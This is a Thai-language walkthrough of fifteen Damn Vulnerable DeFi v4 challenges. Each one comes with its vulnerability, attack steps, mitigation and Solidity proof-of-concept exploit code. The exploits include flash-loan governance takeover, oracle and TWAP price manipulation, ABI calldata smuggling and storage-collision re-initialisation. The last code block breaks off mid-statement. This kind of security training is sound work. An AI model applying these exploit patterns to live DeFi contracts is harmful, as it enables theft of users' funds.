# Damn Vulnerable DeFi v4 สรุปการแก้บัค
by tinamints

## 1. Unstoppable
vault ERC4626 ที่ให้กู้ flash loan ฟรี แต่โดน DoS ได้ เพราะเช็ค balance แบบเข้มงวดเกินไป
### เป้าหมาย :
- หยุดการทำงานของ vault
### ช่องโหว่ :
- `flashLoan` เช็คว่า `convertToShares(totalSupply) == balanceBefore` ซึ่งตั้งสมมติฐานว่า balance ใน vault จะเพิ่มได้ผ่าน `deposit` (ที่ mint shares ให้) เท่านั้น แต่ถ้าโอนโทเคนเข้าไปตรง ๆ ด้วย `transfer` balance จะเพิ่มโดยไม่มี shares ถูก mint เช็คนี้เลยไม่ผ่าน และ `flashLoan` ทุกครั้งจะ revert
### วิธีโจมตี :
- ใช้ `token.transfer` โอน DVT 1 wei (หน่วยที่เล็กที่สุด) เข้า vault ตรง ๆ เช็คนี้ก็พังถาวร
### การป้องกัน :
- อย่าผูกเงื่อนไขที่เข้มงวดไว้กับ `token.balanceOf` โดยตรง ควรให้ vault ERC4626 บันทึก shares/assets ไว้ภายในเอง จะได้ไม่มีใครใช้ `transfer` ตรง ๆ ทำให้ `flashLoan` พังได้ และควรลบเช็ค `convertToShares(totalSupply) != balanceBefore` ออก
### POC
```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

## 2. Naive Receiver
pool flash loan WETH ที่คิดค่าธรรมเนียมคงที่ 1 WETH และรองรับ meta-transaction แต่เปิดช่องให้คนอื่นสั่งกู้แทน receiver และปลอมตัวเป็นผู้ส่งได้
### เป้าหมาย :
- ดึง WETH ทั้งหมดจาก receiver (10 WETH) และ pool (1000 WETH) ไปไว้ที่ recovery
- ใช้ไม่เกิน 2 ทรานแซกชัน
### ช่องโหว่ :
- ใครจะเรียก `flashLoan` โดยระบุ `receiver` เป็นใครก็ได้ และ receiver ก็ไม่เช็คว่าใครเป็นคนสั่งกู้ ผู้โจมตีเลยบังคับให้ receiver จ่ายค่าธรรมเนียม 1 WETH ซ้ำ ๆ ได้ โดยค่าธรรมเนียมทั้งหมดไปเข้า `feeReceiver` ของ pool (คือ deployer)
- `withdraw` ใช้ `_msgSender()` ซึ่งถ้าถูกเรียกมาจาก trusted forwarder จะเชื่อ 20 byte สุดท้ายของ calldata ผู้โจมตีเลยเรียกผ่าน forwarder + `multicall` แล้วต่อ address อะไรก็ได้ไว้ท้าย calldata เพื่อถอนเงินในนามของ deployer
### วิธีโจมตี :
- ยัด `flashLoan` จำนวน 0 ที่ชี้ไปที่ receiver 10 ครั้งไว้ใน `multicall` เดียว ทำให้ 10 WETH ของ receiver ถูกหักเป็นค่าธรรมเนียมไปเข้า deposit ของ deployer
- ถอนเงินทั้งหมดใน pool (1000 + 10 WETH) ในนามของ deployer แล้วส่งไป recovery (POC ใช้ `vm.prank(deployer)` เป็นทางลัด ส่วนวิธีที่โจทย์ตั้งใจให้ทำคือส่ง request ผ่าน forwarder โดยต่อ address ของ deployer ไว้ท้าย calldata ของ `withdraw`)
### การป้องกัน :
- ต้องตรวจสอบว่าใครเป็นคนสั่งกู้จริง ๆ (ไม่ให้ receiver โดนเก็บค่าธรรมเนียมจากเงินกู้ที่ตัวเองไม่ได้ขอ) และไม่เชื่อ `_msgSender()` ที่มากับ forwarder ใน `withdraw` — ใช้ access control ที่รัดกุมและตรวจสอบ forwarder ที่ไว้ใจได้
### POC
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory data = new bytes[](10);
    for (uint256 i = 0; i < 10; i++) {
        data[i] = abi.encodeWithSignature(
            "flashLoan(address,address,uint256,bytes)",
            address(receiver),
            address(weth),
            0,
            ""
        );
    }
    pool.multicall(data);

    vm.startPrank(address(deployer));
    pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
    vm.stopPrank();
}
```

## 3. Truster
pool flash loan DVT ที่ยอมเรียกฟังก์ชันอะไรก็ได้แทนผู้กู้ ทำให้มีช่องโหว่ external call ที่ไม่ได้ตรวจสอบ
### เป้าหมาย :
- ดึง DVT 1M ทั้งหมดจาก pool ไปไว้ที่ recovery
- ใช้แค่ 1 ทรานแซกชัน
### ช่องโหว่ :
- `flashLoan(amount, borrower, target, data)` รัน `target.functionCall(data)` โดยมี pool เป็น `msg.sender` และกู้ 0 ก็ได้ ดังนั้นใครก็สั่งให้ pool เรียกฟังก์ชันอะไรใน contract ไหนก็ได้
### วิธีโจมตี :
- กู้ 0 DVT โดยตั้ง `target = token` และ `data = approve(attacker, โทเคนทั้งหมด)` ให้ pool approve ให้ผู้โจมตีเอง แล้ว `transferFrom` ทุกอย่างไป recovery ทั้งสองขั้นตอนทำใน attacker contract เดียว เลยนับเป็น 1 ทรานแซกชัน
### การป้องกัน :
- ไม่ควรให้ pool เรียก `target.call(data)` อะไรก็ได้ด้วยสิทธิ์ของตัวเอง — ตัดส่วน call ที่ผู้ใช้กำหนดออก หรือทำ whitelist ของ target/selector เพื่อไม่ให้เรียก `approve` บน token ได้
### POC
```solidity
function test_truster() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
    attacker.attack();
}
```

## 4. Side Entrance
pool ETH ที่ฝาก ถอน และกู้ flash loan ฟรีได้ แต่มีช่องโหว่ที่ใช้การฝากเงินแทนการคืนเงินกู้ได้
### เป้าหมาย :
- ดึง ETH 1000 ทั้งหมดจาก pool ไปไว้ที่ recovery
### ช่องโหว่ :
- `flashLoan` เช็คแค่ว่า ETH balance ของ pool กลับมาเท่าเดิมหรือยัง ไม่สนว่า ETH กลับมา *ด้วยวิธีไหน* พอเอา ETH ที่ยืมมา `deposit` กลับเข้าไปก็นับเป็นการคืนเงิน แถมยังเพิ่ม `balances` ของผู้โจมตีอีกด้วย
### วิธีโจมตี :
- กู้ ETH ทั้ง 1000 แล้วใน `execute` เอาไป `deposit` ทันที เช็คของ loan ผ่าน และผู้โจมตีมี balance 1000 ETH จากนั้นก็ `withdraw` แล้วส่ง ETH ไป recovery
### การป้องกัน :
- ไม่ให้การ `deposit` ระหว่างที่กู้อยู่นับเป็นการคืนเงิน: ใส่ reentrancy guard ตัวเดียวคุมทั้ง `flashLoan` และ `deposit` หรือแยกการเช็คการคืนเงินออกจากเงินฝากของผู้ใช้
### POC
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
    exploit.exploit();
}
```

## 5. The Rewarder
ตัวแจก reward DVT และ WETH ด้วย Merkle proof แต่มีช่องโหว่ที่ทำให้เคลม reward เดิมซ้ำได้หลายรอบ
### เป้าหมาย :
- ดึงเงินจาก distributor ไปไว้ที่ recovery ให้ได้มากที่สุด (เหลือแค่เศษ)
- ผู้เล่นอยู่ในรายชื่อ beneficiaries จึงเคลมได้
### ช่องโหว่ :
- `claimRewards` รับ claim เป็น list แต่จะเช็คและตั้ง bit "เคลมแล้ว" ก็ต่อเมื่อ token เปลี่ยน หรือเมื่อถึง claim สุดท้ายเท่านั้น ดังนั้น claim ซ้ำของ token และ batch เดียวกันในการเรียกครั้งเดียวจึงไม่เคยถูกเช็คเทียบกันเลย
### วิธีโจมตี :
- สร้าง array ของ claim ที่ใส่ claim DVT ที่ถูกต้องของผู้เล่น (พร้อม Merkle proof) ซ้ำหลายรอบจนดึง DVT ออกหมด แล้วทำแบบเดียวกันกับ WETH จากนั้นเรียก `claimRewards` ครั้งเดียว แล้วส่งทั้งหมดไป recovery
### การป้องกัน :
- ทำเครื่องหมายว่า claim ถูกใช้แล้ว (set claimed bit) ก่อนหรือระหว่างลูป และ reject claim ที่ (token, batch) ซ้ำ จะได้เคลม reward เดิมซ้ำในการเรียกครั้งเดียวไม่ได้
### POC
```solidity
function test_theRewarder() public checkSolvedByPlayer {
    string memory dvtJson = vm.readFile("test/the-rewarder/dvt-distribution.json");
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtJson), (Reward[]));

    string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
    Reward[] memory wethRewards = abi.decode(vm.parseJson(wethJson), (Reward[]));

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    uint256 playerDvtAmount;
    bytes32[] memory playerDvtProof;
    uint256 playerWethAmount;
    bytes32[] memory playerWethProof;

    for (uint i = 0; i < dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            playerDvtAmount = dvtRewards[i].amount;
            playerWethAmount = wethRewards[i].amount;
            playerDvtProof = merkle.getProof(dvtLeaves, i);
            playerWethProof = merkle.getProof(wethLeaves, i);
            break;
        }
    }
    require(playerDvtAmount > 0, "Player not found in DVT distribution");
    require(playerWethAmount > 0, "Player not found in WETH distribution");

    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount) +
        (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
    uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
    Claim[] memory claims = new Claim[](totalClaimsNeeded);

    for (uint256 i = 0; i < totalClaimsNeeded; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
            tokenIndex: i < dvtClaims ? 0 : 1,
            proof: i < dvtClaims ? playerDvtProof : playerWethProof
        });
    }

    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

## 6. Selfie
pool flash loan DVT ที่ถูกควบคุมด้วย governance แบบโหวตด้วยโทเคน แต่มีช่องโหว่ที่ยืมอำนาจโหวตผ่าน flash loan ได้
### เป้าหมาย :
- ดึง DVT 1.5M ทั้งหมดจาก pool ไปไว้ที่ recovery
### ช่องโหว่ :
- governance ให้ใครก็ได้คิว action ถ้าถืออำนาจโหวตเกินครึ่งหนึ่ง *ณ ตอนนั้น* และ pool มี `emergencyExit` ที่ส่งเงินทั้งหมดไปที่ไหนก็ได้ (เรียกได้เฉพาะ governance) ส่วนอำนาจโหวตก็ยืมจาก pool เองได้
### วิธีโจมตี :
- กู้โทเคนทั้งหมดของ pool ด้วย flash loan, delegate อำนาจโหวตให้ตัวเอง แล้วคิว `emergencyExit(recovery)` เป็น governance action จากนั้นคืนเงินกู้ รอ 2 วันด้วย `vm.warp` แล้วค่อย execute action
### การป้องกัน :
- คิดอำนาจโหวตจาก balance ที่ถือไว้ก่อนสร้าง proposal (แบบ checkpoint หรือถ่วงน้ำหนักตามเวลา) เพื่อไม่ให้ balance ที่ flash loan มาในบล็อกเดียวไปถึง quorum ได้
### POC
```solidity
function test_selfie() public checkSolvedByPlayer {
    pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
    vm.warp(block.timestamp + 2 days);
    governance.executeAction(1);
}
```

## 7. Compromised
exchange NFT ที่ตั้งราคาจาก median (ค่ากลาง) ของ oracle 3 แหล่ง แต่มีช่องโหว่เพราะ private key ของ oracle หลุด
### เป้าหมาย :
- ดึง ETH 999 ทั้งหมดจาก exchange ไปไว้ที่ recovery
- ผู้เล่นต้องไม่เหลือ NFT ตอนจบ
- ราคา NFT ต้องกลับมาเท่าเดิมตอนจบ
### ช่องโหว่ :
- hex 2 ชุดที่หลุดมาในคำอธิบายโจทย์ ถอดรหัส (hex → base64 → ข้อความ) ได้เป็น private key ของ oracle 2 จาก 3 แหล่ง ราคาคือ median ของทั้ง 3 แหล่ง พอคุมได้ 2 แหล่งก็คุมราคาได้เลย
### วิธีโจมตี :
- ใช้ key ทั้งสองตั้งราคาเป็น 0, ซื้อ NFT 1 ชิ้นด้วย 1 wei, ตั้งราคากลับเป็น 999 ETH, ขาย NFT คืนได้ 999 ETH แล้วส่ง ETH ไป recovery
### การป้องกัน :
- เก็บ private key ของ oracle ให้ปลอดภัย และรวมราคาจากหลายแหล่งที่เป็นอิสระพร้อมเช็คความเบี่ยงเบน (เช่น Chainlink) จะได้ไม่ใช่แค่ key รั่วหรือโดนคุมไม่กี่แหล่งก็กำหนดราคาได้
### POC
```solidity
function test_compromised() public checkSolved {
    vm.prank(source1); oracle.postPrice("DVNFT", 0);
    vm.prank(source2); oracle.postPrice("DVNFT", 0);
    vm.startPrank(player);
    uint256 nftId = exchange.buyOne{value: 1 wei}();
    nft.approve(address(exchange), nftId);
    vm.stopPrank();
    vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.startPrank(player);
    exchange.sellOne(nftId);
    payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopPrank();
}
```

## 8. Puppet
lending pool DVT ที่ตีราคาหลักประกันจาก pool Uniswap V1 ขนาดเล็ก จึงโดนปั่นราคา spot ของ oracle ได้
### เป้าหมาย :
- ดึง DVT 100k ทั้งหมดจาก lending pool ไปไว้ที่ recovery
- ใช้แค่ 1 ทรานแซกชัน
### ช่องโหว่ :
- pool ต้องการหลักประกันเป็น ETH มูลค่า 2 เท่าของ DVT ที่ยืม โดยดูราคา spot ของ Uniswap V1 (ETH balance / DVT balance ของ pair) ซึ่ง pair นี้มีแค่ 10 ETH / 10 DVT แค่ swap ก้อนใหญ่ครั้งเดียวราคาก็ขยับมหาศาล
### วิธีโจมตี :
- ทำทั้งหมดใน attacker contract เดียว: ดึง DVT 1000 ของผู้เล่นมาด้วยลายเซ็น EIP-2612 `permit` (การ approve แบบเซ็นชื่อ ไม่ต้องส่ง tx `approve` แยก), เทเข้า Uniswap V1 ให้ราคา DVT ดิ่ง แล้วยืม DVT 100k ด้วยหลักประกันที่เหลือนิดเดียว ส่งไป recovery
### การป้องกัน :
- ดึงราคาจาก oracle ที่ปั่นยาก (TWAP / Chainlink) ไม่ใช่ราคา spot ณ ตอนนั้นจาก reserves ของ Uniswap V1
### POC
```solidity
function test_puppet() public checkSolvedByPlayer {
    PuppetPoolAttacker attacker = new PuppetPoolAttacker(
        address(token), address(lendingPool), address(uniswapV1Exchange), recovery
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
    attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
}
```

## 9. Puppet V2
lending pool DVT ที่ตีราคาหลักประกัน WETH จาก reserves ของ Uniswap V2 จึงโดนปั่นราคา spot ของ oracle ได้
### เป้าหมาย :
- ดึง DVT 1M ทั้งหมดจาก lending pool ไปไว้ที่ recovery
### ช่องโหว่ :
- pool ต้องการหลักประกันเป็น WETH มูลค่า 3 เท่าของ DVT ที่ยืม โดยดูราคา spot จาก `getReserves` ของ Uniswap V2 ซึ่ง pair เล็กมาก (100 DVT / 10 WETH) พอขาย DVT 10k ของผู้เล่นราคาก็ดิ่ง
### วิธีโจมตี :
- ขาย DVT 10k ทั้งหมดเป็น ETH บน Uniswap V2, wrap ETH เป็น WETH, approve หลักประกันที่ตอนนี้เหลือนิดเดียว, ยืม DVT 1M แล้วส่งไป recovery
### การป้องกัน :
- เหมือน Puppet: ใช้ TWAP หรือ oracle ภายนอกตีมูลค่าหลักประกัน แทนราคา spot จาก `getReserves` ของ Uniswap V2
### POC
```solidity
function test_puppetV2() public checkSolvedByPlayer {
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
    uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
    uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
    weth.deposit{value: ethBalance}();
    weth.approve(address(lendingPool), requiredWETH);
    lendingPool.borrow(poolTokens);
    token.transfer(recovery, token.balanceOf(player));
}
```

## 10. Free Rider
marketplace NFT ที่ขาย NFT 6 ชิ้น ชิ้นละ 15 ETH แต่ logic การจ่ายเงินใน `buyMany` พัง
### เป้าหมาย :
- ดึง NFT ทั้ง 6 ชิ้นจาก marketplace ไปให้ recovery manager
- ผู้เล่นได้ bounty 45 ETH
### ช่องโหว่ :
- `buyMany` เช็ค `msg.value >= price` แยกทีละชิ้น จ่าย 15 ETH ครั้งเดียวก็ผ่านเช็คครบทั้ง 6 ชิ้น
- แถมยังโอน NFT ให้ผู้ซื้อ *ก่อน* จ่ายเงินให้ "เจ้าของ" เงินที่ควรไปถึงผู้ขายเลยวนกลับมาที่ผู้ซื้อเอง
### วิธีโจมตี :
- flash swap 15 WETH จาก Uniswap V2, unwrap เป็น ETH, ซื้อ NFT ทั้ง 6 ชิ้นด้วย 15 ETH (แล้วได้เงินคืนมา 90 ETH), ส่ง NFT ให้ recovery manager เพื่อรับ bounty 45 ETH แล้วคืน flash swap พร้อมค่าธรรมเนียม
### การป้องกัน :
- คิดเงินเป็นผลรวมราคาของ NFT ทุกชิ้น (เช็คการจ่ายเงินทีละชิ้น) และจ่ายให้ผู้ขาย (เจ้าของก่อนโอน) ตามหลัก checks-effects-interactions
### POC
```solidity
function test_freeRider() public checkSolvedByPlayer {
    flashLoanUser attacker = new flashLoanUser(
        address(marketplace), address(recoveryManager), address(nft),
        address(uniswapPair), address(token), address(weth), address(player)
    );
    attacker.flashLoanInitilizer(15 ether);
}
```

## 11. Backdoor
registry ที่จ่าย 10 DVT ให้ Safe wallet ที่สร้างให้ beneficiary แต่ละคน (4 คน) แต่มีช่องโหว่ให้แทรกคำสั่งระหว่าง setup wallet
### เป้าหมาย :
- ดึง DVT 40 ทั้งหมดจาก registry ไปไว้ที่ recovery
- ใช้แค่ 1 ทรานแซกชัน
### ช่องโหว่ :
- ใครก็สร้าง Safe *ให้* beneficiary ผ่าน `createProxyWithCallback` ได้ และ registry จะจ่ายเงินให้ wallet ใหม่นั้น registry เช็ค owner กับ threshold แต่ไม่เช็ค `to`/`data` ใน `setup()` ของ Safe ทำให้ wallet ใหม่ delegatecall ไปที่ contract ไหนก็ได้
### วิธีโจมตี :
- ทำกับผู้ใช้ทั้ง 4 คน: สร้าง Safe ที่ `setup()` ไป delegatecall หา module ของผู้โจมตี ให้ wallet `approve` DVT ให้ผู้โจมตี พอ registry ส่ง 10 DVT เข้า wallet ผู้โจมตีก็ `transferFrom` ไป recovery ทันที ทั้งหมดรันใน constructor ของ attacker เดียว เลยเป็น 1 ทรานแซกชัน
### การป้องกัน :
- ให้ registry ตรวจสอบ setup ของ wallet ใหม่ก่อนจ่ายเงิน (owner ต้องตรงกับที่คาดไว้, ไม่มี module/delegatecall/การเรียกที่ถูกแทรก) แทนที่จะเชื่อ calldata `initializer` ที่ใครจะกำหนดเองก็ได้
### POC
```solidity
function test_backdoor() public checkSolvedByPlayer {
    new Attacker(
        address(walletFactory), address(singletonCopy),
        address(walletRegistry), address(token), recovery, users
    );
}
```

## 12. Climber
vault แบบ UUPS upgradeable ที่มี timelock เป็นเจ้าของ แต่ timelock รัน action ก่อนเช็คว่า schedule ไว้หรือยัง
### เป้าหมาย :
- ดึง DVT 10M ทั้งหมดจาก vault ไปไว้ที่ recovery
### ช่องโหว่ :
- `ClimberTimelock.execute()` รันทุก call ก่อน แล้วค่อยมาเช็คว่า operation ถูก schedule ไว้และถึงเวลาแล้ว batch จึง schedule *ตัวเอง* ระหว่างที่กำลังรันได้ และเพราะ timelock เป็นเจ้าของ vault call จาก timelock จึงอัพเกรด vault ได้
### วิธีโจมตี :
- execute batch เดียวที่: ①ตั้ง delay เป็น 0 ②ให้สิทธิ์ proposer แก่ attack contract ③อัพเกรด vault เป็น implementation อันตราย ④เรียก attack contract ให้ `schedule` batch เดียวกันนี้ เพื่อให้เช็คตอนท้ายผ่าน จากนั้นเรียก `sweepFunds` บน vault ที่อัพเกรดแล้ว เพื่อส่งทั้งหมดไป recovery
### การป้องกัน :
- ต้องเช็คว่า operation ถูก schedule และถึงเวลาแล้ว *ก่อน* execute (และทำเครื่องหมายว่า executed ก่อนเรียก external call) — บังคับลำดับ schedule ก่อน execute
### POC
```solidity
function test_climber() public checkSolvedByPlayer {
    MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
    ClimberAttack attackContract = new ClimberAttack(
        payable(address(vault)), payable(address(timelock)), recovery, address(token)
    );
    attackContract.attack(address(maliciousImpl));
}
```

## 13. Wallet Mining
wallet deployer ที่จ่ายรางวัลเมื่อ deploy Safe ไปยัง address ที่ได้รับอนุญาต แต่มีช่องโหว่ storage slot ชนกัน ทำให้ init ซ้ำได้
### เป้าหมาย :
- กู้คืน DVT 20M ทั้งหมดจาก deposit address ของผู้ใช้กลับไปให้ผู้ใช้ และส่งรางวัลของ wallet deployer ให้ ward
- ผู้ใช้ห้ามส่งทรานแซกชันใดเลย ส่วนผู้เล่นส่งได้แค่ 1 ทรานแซกชัน
### ช่องโหว่ :
- ตัวแปร `needsInit` ของ `AuthorizerUpgradeable` อยู่ที่ storage slot 0 ซึ่งไปชนกับ address `upgrader` ของ proxy (ซึ่งไม่เป็นศูนย์เสมอ) ใครก็เรียก `init()` ซ้ำเพื่อให้สิทธิ์ตัวเองได้
- `WalletDeployer.drop()` เช็คแค่ว่าคู่ `(wat, nonce)` ที่เลือกจะ deploy ด้วย CREATE2 ไปตรงกับ address ที่ได้รับอนุญาตหรือไม่ เราเลยเดา nonce ที่ถูกด้วยการ brute-force ได้
### วิธีโจมตี :
- เรียก `init()` ซ้ำเพื่อให้ผู้โจมตีได้สิทธิ์สำหรับ `USER_DEPOSIT_ADDRESS`, brute-force หา nonce ที่ทำให้ factory deploy ไปที่ address นั้น, deploy Safe จริง (ที่มี `user` เป็นเจ้าของ) ด้วย `drop()`, ถอนเงินออกด้วยลายเซ็นของผู้ใช้ผ่าน `execTransaction` แล้วส่งรางวัลของ deployer ให้ `ward` ทั้งหมดนี้ทำใน constructor ของ attacker เดียว
### การป้องกัน :
- เก็บ flag init ไว้ใน slot เฉพาะที่ไม่ชนกับใคร (ใช้ `Initializable` ของ OZ) จะได้เรียก `init()` ซ้ำไม่ได้ และอย่าโอนเงินเข้า address ที่คำนวณไว้ล่วงหน้าก่อนตรวจสอบเจ้าของของ wallet ที่ deploy จริง
### POC
```solidity
function test_walletMining() public checkSolvedByPlayer {
    new Attacker(address(token), address(authorizer), address(walletDeployer), user, userPrivateKey, ward);
}

contract Attacker {
    address constant USER_DEPOSIT_ADDRESS = 0xe8BbB8395a7984D06A794aE86e4D723526b55E98;
    IHevm constant hevm = IHevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor(
        address token,
        address authorizer,
        address walletDeployer,
        address user,
        uint256 userPrivateKey,
        address ward
    ) {
        // 1. Get authorized
        getAuthorized(authorizer);

        // 2. Find the nonce
        bytes memory setupCalldata = _buildSetup(user);
        uint256 nonce = findNonce(walletDeployer, setupCalldata);

        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
        //    and pays 1 DVT to this contract (msg.sender)
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);

        // 4. Drain the Safe
        _drainSafe(token, user, userPrivateKey);

        // 5. Forward the reward
        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
    }

    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
    function getAuthorized(address authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _buildSetup(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
    }

    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
        WalletDeployer wd = WalletDeployer(walletDeployer);
        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
        bytes32 initializerHash = keccak256(setupCalldata);
        address factory = address(wd.cook());
        for (uint256 n = 0; n < 1000; n++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n)), initCodeHash
            )))));
            if (predicted == USER_DEPOSIT_ADDRESS) {
                console.log("found nonce:", n);
                return n;
            }
        }
        revert("nonce not found in 0..999");
    }

    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
        );
        bytes32 txHash = safe.getTransactionHash(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
        );
        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
        safe.execTransaction(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );
    }
}
```

## 14. Puppet V3
lending pool DVT ที่ตีราคาหลักประกัน WETH ด้วย TWAP 10 นาทีของ Uniswap V3 จึงโดนปั่น TWAP ได้ เพราะ pool มีสภาพคล่องต่ำ
### เป้าหมาย :
- ดึง DVT 1M ทั้งหมดจาก lending pool ไปไว้ที่ recovery
- ต้องทำให้เสร็จภายใน 115 วินาทีหลัง setup
### ช่องโหว่ :
- pool ใช้ TWAP (ราคาเฉลี่ยถ่วงน้ำหนักตามเวลา) แค่ 10 นาที บน pool Uniswap V3 ที่สภาพคล่องน้อย (100 DVT / 100 WETH) แค่ swap ก้อนใหญ่พอแล้วค้างราคาไว้สัก ~2 นาที ค่าเฉลี่ยก็ถูกลากลงมาเยอะ
### วิธีโจมตี :
- ขาย DVT 110 ของผู้เล่นเข้า pool Uniswap V3 ด้วย `exactInputSingle` ให้ราคาร่วง แล้ว `vm.warp` ไปข้างหน้า 114 วินาที (ต่ำกว่าเวลาจำกัดนิดเดียว) ให้ TWAP ขยับเข้าใกล้ราคาที่ร่วง ตอนนี้ `calculateDepositOfWETHRequired` ถูกพอที่จะยืม DVT 1M ทั้งหมดด้วย WETH ที่ผู้เล่นมี แล้วส่งไป recovery
### การป้องกัน :
- ใช้ TWAP ที่ window ยาวขึ้น (และ/หรือเพิ่ม oracle ตัวที่สอง) เพื่อไม่ให้การดันราคาช่วงสั้น ๆ ในบล็อกเดียวขยับค่าเฉลี่ยมากพอจะหลอก quote ของหลักประกันได้
### POC
```solidity
function test_puppetV3() public checkSolvedByPlayer {
    address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    token.approve(address(uniswapRouterAddress), type(uint256).max);
    uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    console.log("quote1: ", quote1);

    ISwapRouter(uniswapRouterAddress).exactInputSingle(
        ISwapRouter.ExactInputSingleParams(
            address(token),
            address(weth),
            3000,
            address(player),
            block.timestamp,
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            0
        )
    );
    vm.warp(block.timestamp + 114);
    uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    weth.approve(address(lendingPool), quote);
    console.log("quote: ", quote);
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```

## 15. ABI Smuggling
vault ที่แบ่งสิทธิ์ให้แต่ละคนเรียกได้เฉพาะ function selector ที่อนุญาตผ่าน `execute` แต่มีช่องโหว่ให้ลักลอบใส่ calldata ได้
### เป้าหมาย :
- ดึง DVT 1M ทั้งหมดจาก vault ไปไว้ที่ recovery
### ช่องโหว่ :
- `execute()` เช็คสิทธิ์โดยอ่าน selector จากตำแหน่ง calldata ที่ hardcode ไว้ (byte ที่ 100) ไม่ได้อ่านจากตำแหน่งที่ offset ของ `actionData` ชี้ไปจริง selector ที่ถูกเช็คกับ call ที่ถูกรันจึงเป็นคนละตัวกันได้
### วิธีโจมตี :
- ประกอบ calldata เอง: วาง selector ของ `withdraw` (ที่ผู้เล่นมีสิทธิ์เรียก) ไว้ที่ byte 100 เป็นตัวหลอก แล้วตั้ง offset ของ `actionData` ให้ชี้ไปไกลกว่านั้น ไปที่ call `sweepFunds(recovery, token)` (ที่ผู้เล่นไม่มีสิทธิ์เรียก) เช็คสิทธิ์เจอตัวหลอกเลยผ่าน แต่ vault รัน `sweepFunds` จริง
### การป้องกัน :
- ถอดรหัส `actionData` ให้ตรงกับที่จะถูก execute จริง แล้วเช็ค selector ของ payload จริงนั้น — อย่าอ่าน selector สำหรับเช็คสิทธิ์จากตำแหน่ง calldata ที่ hardcode ไว้
### POC
```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(address(vault), address(token), recovery);
    bytes memory payload = exploit.executeExploit();
    address(vault).call(payload);
}

contract Exploit {
    function executeExploit() external returns (bytes memory) {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
